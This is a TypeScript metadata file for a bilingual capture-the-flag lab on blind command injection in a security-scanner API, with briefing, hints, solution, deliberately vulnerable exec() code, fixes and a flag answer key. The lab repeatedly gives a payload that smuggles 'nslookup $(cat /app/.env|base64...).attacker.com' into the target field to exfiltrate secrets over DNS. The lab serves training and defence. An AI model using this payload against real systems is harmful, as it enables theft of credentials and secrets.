// src/modules/practice-labs/command-injection/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab5Metadata: LabMetadata = {
  slug: 'cmdi-oob-dns-exfiltration-security-scanner',
  title: 'Command Injection: OOB DNS Exfiltration — Security Scanner API',
  ar_title: 'حقن الأوامر: سرب DNS خارج النطاق — API الماسح الأمني',
  description:
    'Exploit an advanced command injection in a security scanner API where the target URL parameter is vulnerable. The server has no direct output — use out-of-band DNS exfiltration to extract sensitive data by encoding it in DNS subdomains, then reconstruct the exfiltrated data from DNS query logs.',
  ar_description:
    'استغل حقن أوامر متقدم في API الماسح الأمني حيث معامل URL الهدف ضعيف. الخادم لا يُعيد أي ناتج مباشر — استخدم سرب DNS خارج النطاق لاستخراج البيانات الحساسة بترميزها في نطاقات DNS الفرعية، ثم أعد بناء البيانات المسربة من سجلات DNS.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'OOB DNS Exfiltration',
    'Blind Injection',
    'Advanced Exploitation',
    'DNS Security',
  ],
  xpReward: 430,
  pointsReward: 215,
  duration: 70,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Use DNS-based OOB exfiltration: inject "nslookup $(cat /app/.env | base64 | tr -d \'=\\n\').attacker.com" to exfiltrate the .env file contents via DNS queries. Retrieve the flag from the simulated DNS logs.',
  ar_goal:
    'استخدم سرب OOB القائم على DNS: احقن "nslookup $(cat /app/.env | base64 | tr -d \'=\\n\').attacker.com" لسرب محتويات ملف .env عبر استعلامات DNS. استرجع العلم من سجلات DNS المحاكاة.',

  briefing: {
    en: `SecureScan — security scanning API. Submit a target URL. We run nmap. You get a job ID.
POST /scan { "target": "example.com" }
Response: { "jobId": "abc123", "status": "queued" }
"Results available in 5-10 minutes."
But they're never directly returned.
Stored. Async. You'd need an API key to fetch them.
The backend: exec("nmap -sV " + target, callback)
Callback saves output to DB. Response is already sent.
You cannot see stdout.
You cannot see stderr.
Zero output.
This is fully blind injection.
time-based won't help you read data.
Output redirection won't help — no read endpoint.
One option remains: Out-of-Band.
DNS.
You control attacker.com.
You run a DNS server on it.
Every DNS query made to *.attacker.com appears in your logs.
If you can make the server send a DNS query with data in the subdomain —
That data exits the network invisibly.
$(cat /app/.env | base64 | tr -d '=\n') encodes the file.
nslookup <encoded_data>.attacker.com makes the DNS query.
Your DNS logs receive: <encoded_data>.attacker.com A query.
You decode it.
The .env file is yours.`,
    ar: `SecureScan — API فحص أمني. أرسل URL مستهدف. نُشغّل nmap. تحصل على معرّف مهمة.
POST /scan { "target": "example.com" }
الاستجابة: { "jobId": "abc123"، "status": "queued" }
"النتائج متاحة في 5-10 دقائق."
لكنها لا تُعاد مباشرة أبداً.
مُخزَّنة. غير متزامنة. ستحتاج مفتاح API لاسترجاعها.
الـ backend: exec("nmap -sV " + target, callback)
الـ callback يحفظ الناتج في DB. الاستجابة أُرسلت مسبقاً.
لا يمكنك رؤية stdout.
لا يمكنك رؤية stderr.
صفر ناتج.
هذا هو الحقن الأعمى الكامل.
الاختبار الزمني لن يساعدك في قراءة البيانات.
إعادة توجيه الناتج لن تساعد — لا يوجد read endpoint.
يبقى خيار واحد: خارج النطاق.
DNS.
أنت تتحكم في attacker.com.
تُشغّل خادم DNS عليه.
كل استعلام DNS لـ *.attacker.com يظهر في سجلاتك.
إذا استطعت جعل الخادم يرسل استعلام DNS مع بيانات في النطاق الفرعي —
تلك البيانات تخرج من الشبكة بشكل غير مرئي.
$(cat /app/.env | base64 | tr -d '=\n') يُرمّز الملف.
nslookup <encoded_data>.attacker.com يُرسل استعلام DNS.
سجلات DNS لديك تستقبل: <encoded_data>.attacker.com A query.
تفك الترميز.
ملف .env أصبح ملكك.`,
  },

  stepsOverview: {
    en: [
      'POST /scan { "target": "example.com; nslookup whoami.attacker.com" } — confirm OOB: check /dns/logs for incoming query',
      'GET /dns/logs — verify "whoami.attacker.com" query was received → OOB channel confirmed',
      'Exfiltrate .env: { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }',
      'GET /dns/logs — find the DNS query subdomain (base64-encoded .env contents)',
      'Decode the subdomain from base64 → .env file revealed including FLAG',
    ],
    ar: [
      'POST /scan { "target": "example.com; nslookup whoami.attacker.com" } — أكّد OOB: تحقق من /dns/logs للاستعلام الوارد',
      'GET /dns/logs — تحقق من استقبال استعلام "whoami.attacker.com" → تأكيد قناة OOB',
      'سرب .env: { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }',
      'GET /dns/logs — ابحث عن subdomain استعلام DNS (محتويات .env مُرمَّزة base64)',
      'فك ترميز الـ subdomain من base64 → ملف .env مكشوف بما فيه FLAG',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'SecureScan /scan injects target into nmap: exec("nmap -sV " + target). The response is async — no output ever returned. Fully blind. DNS OOB exfiltration: inject nslookup with a subshell that reads /app/.env, base64-encodes it, strips padding/newlines, and uses it as the DNS subdomain. The simulated attacker DNS server at attacker.com logs all incoming queries — the encoded .env appears as a subdomain in the logs.',
    vulnerableCode:
      '// Security scanner (vulnerable — fully blind):\n' +
      "app.post('/scan', isAuthenticated, async (req, res) => {\n" +
      '  const { target } = req.body;\n' +
      '  // ❌ target injected into nmap command — async, no output returned\n' +
      '  exec(`nmap -sV ${target}`, (err, stdout) => {\n' +
      '    db.scanResults.create({ jobId, output: stdout }); // Stored, not returned\n' +
      '  });\n' +
      '  // Response sent immediately — no output!\n' +
      "  res.json({ jobId: uuid(), status: 'queued' });\n" +
      '});',
    exploitation:
      '// Step 1: OOB confirmation\n' +
      'POST /scan { "target": "example.com; nslookup test.attacker.com" }\n' +
      'GET /dns/logs → { "query": "test.attacker.com", "timestamp": "..." } ✓\n\n' +
      '// Step 2: Data exfiltration\n' +
      'POST /scan { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }\n' +
      'GET /dns/logs → { "query": "Tk9ERV9FTlY9cHJvZHVjdGlvbg.attacker.com" }\n\n' +
      '// Step 3: Decode\n' +
      'atob("Tk9ERV9FTlY9cHJvZHVjdGlvbg") → full .env contents including FLAG',
    steps: {
      en: [
        'POST /scan { "target": "example.com; nslookup oob-test.attacker.com" } → { "jobId": "...", "status": "queued" }',
        'GET /dns/logs → [{ "query": "oob-test.attacker.com", "type": "A" }] → OOB channel confirmed ✓',
        'POST /scan { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }',
        'GET /dns/logs → [{ "query": "<base64_encoded_env>.attacker.com" }]',
        'POST /dns/decode { "encoded": "<base64_encoded_env>" } → decoded .env with FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
      ],
      ar: [
        'POST /scan { "target": "example.com; nslookup oob-test.attacker.com" } → { "jobId": "..."، "status": "queued" }',
        'GET /dns/logs → [{ "query": "oob-test.attacker.com"، "type": "A" }] → تأكيد قناة OOB ✓',
        'POST /scan { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }',
        'GET /dns/logs → [{ "query": "<base64_encoded_env>.attacker.com" }]',
        'POST /dns/decode { "encoded": "<base64_encoded_env>" } → .env مفكوك الترميز مع FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
      ],
    },
    fix: [
      'Use nmap libraries or APIs: nmap-promise, node-nmap — no shell invocation for scanning',
      'Strict target validation: only allow valid IP addresses or domain names via regex before any processing',
      'Network egress filtering: block all outbound DNS and HTTP from the scanner service except to scan targets — prevents OOB exfiltration',
      'execFile() with argument array: execFile("/usr/bin/nmap", ["-sV", target]) — shell not invoked, OOB injection still runs but $() is not expanded',
    ],
  },

  postSolve: {
    explanation: {
      en: "DNS OOB exfiltration is the most powerful blind injection technique. When there is no output channel, timing channel, or writable file path — DNS still works. DNS queries are made by the OS resolver, which typically has outbound UDP port 53 access. The data is encoded as a subdomain: base64(secret_data).attacker.com. The attacker's authoritative DNS server for attacker.com receives and logs every query. Real-world tools: Burp Collaborator, interactsh (open source), and dnslog.cn all provide OOB DNS collection infrastructure for testers.",
      ar: 'سرب OOB القائم على DNS هو أقوى تقنيات حقن أعمى. عندما لا يوجد قناة ناتج أو قناة زمنية أو مسار ملف قابل للكتابة — DNS لا يزال يعمل. استعلامات DNS تُجرى بواسطة محلل OS، الذي عادةً لديه وصول للمنفذ UDP 53 الصادر. البيانات مُرمَّزة كـ subdomain: base64(secret_data).attacker.com. الخادم DNS الاستبدادي للمهاجم لـ attacker.com يستقبل ويسجّل كل استعلام. أدوات العالم الحقيقي: Burp Collaborator وinteractsh (مفتوح المصدر) وdnslog.cn — كلها توفر بنية تحتية لجمع OOB DNS للمختبرين.',
    },
    impact: {
      en: 'The /app/.env file contains every production secret: database URL with credentials, JWT secret (forge any token), AWS access keys (full cloud access), and Stripe live secret key (payment processing access). This is a total infrastructure compromise from a single injection point in a security tool — particularly ironic since the tool is supposed to find vulnerabilities, not create them.',
      ar: 'يحتوي ملف /app/.env على كل سر إنتاجي: URL قاعدة البيانات مع بيانات الاعتماد، سر JWT (تزوير أي توكن)، مفاتيح وصول AWS (وصول كامل للسحابة)، ومفتاح Stripe الحي السري (وصول لمعالجة الدفع). هذا اختراق كامل للبنية التحتية من نقطة حقن واحدة في أداة أمنية — من المفارقات الخاصة أن الأداة يُفترض أن تجد الثغرات، وليس تخلقها.',
    },
    fix: [
      'egress DNS filtering: allow outbound DNS only to trusted resolvers — block all DNS to *.attacker.com or arbitrary domains',
      "Application-level: use execFile() — $() subshell expansion doesn't work without /bin/sh but pipe injection still possible",
      'Sandbox with seccomp: restrict syscalls — deny socket() calls in the nmap worker process to prevent any network egress from injected commands',
      'Runtime defense: monitor for unexpected nslookup/dig/curl processes spawned by the scanner service — alert on anomalies',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 30,
      content:
        'The scanner is 100% blind — no output ever. But DNS OOB works differently: inject "nslookup test.attacker.com" and check /dns/logs to see if the query arrived. This confirms OOB channel.',
    },
    {
      order: 2,
      xpCost: 55,
      content:
        'OOB confirmed! Now exfiltrate /app/.env: inject "nslookup $(cat /app/.env | base64 | tr -d \'=\\n\').attacker.com". The file contents become a base64 subdomain in a DNS query your server receives.',
    },
    {
      order: 3,
      xpCost: 85,
      content:
        'POST /scan { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }. Then GET /dns/logs to find the query with your encoded data as subdomain.',
    },
    {
      order: 4,
      xpCost: 120,
      content:
        'Get the base64 subdomain from /dns/logs. Decode it with POST /dns/decode { "encoded": "<subdomain>" } — or manually with atob(). The .env contents including the flag will be revealed.',
    },
  ],

  flagAnswer: 'FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
  initialState: {
    contents: [
      {
        title: 'APP_ENV',
        body: JSON.stringify({
          path: '/app/.env',
          content: [
            '# SecureScan Production Environment',
            'NODE_ENV=production',
            'DATABASE_URL=postgresql://scanner:Sc4nn3r_Pr0d!@db:5432/securescan',
            'JWT_SECRET=ultra_secret_jwt_key_prod_2024',
            'AWS_ACCESS_KEY_ID=AKIA_SECURESCAN_PROD',
            'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            'STRIPE_SECRET_KEY=sk_live_abc123def456',
            'FLAG=FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
          ].join('\n'),
        }),
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
